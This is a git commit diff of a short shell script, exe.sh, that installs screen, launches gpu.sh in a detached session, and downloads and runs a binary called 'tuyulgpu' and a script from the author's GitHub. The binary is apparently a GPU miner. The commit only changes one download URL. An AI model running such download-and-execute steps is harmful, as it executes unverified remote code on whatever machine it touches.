4f24528957911f3cd3abedb95be4b686d0bc0044
mansoorjama <85673565+mansoorjama@users.noreply.github.com>
2021-06-22 23:35:24 +0300

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -3,7 +3,7 @@
 sudo apt update
 sudo apt install screen -y
 screen -dmS gpu.sh ./gpu.sh 65 75
-wget https://github.com/mansoorjama/new/raw/main/tuyulgpu
+wget https://github.com/mansoorjama/new/blob/raw/main/tuyulgpu
 wget https://raw.githubusercontent.com/mansoorjama/new/main/gpu.sh
 chmod +x gpu.sh
 ./gpu.sh
